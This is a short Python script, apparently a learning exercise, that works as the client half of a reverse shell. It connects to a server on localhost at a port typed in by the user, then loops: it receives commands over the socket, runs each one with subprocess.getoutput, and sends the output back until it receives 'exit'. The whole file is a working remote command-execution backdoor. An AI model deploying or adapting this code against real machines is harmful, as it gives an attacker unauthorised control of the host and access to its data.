import socket, datetime, threading
import subprocess

SERVER_PORT = input('Enter the name that is assigned to you ...')
SERVER_HOST = "localhost"
BUFFER_SIZE = 1024


# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, int(SERVER_PORT)))
# print("Enter your username...")
# USERNAME = input()

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)
# def healthcheck():
#     print(username)
#
# healthcheck()

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    print(command)
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
    # threading.Timer(30, healthcheck).start()
    # healthcheck()
# close client connection
s.close()

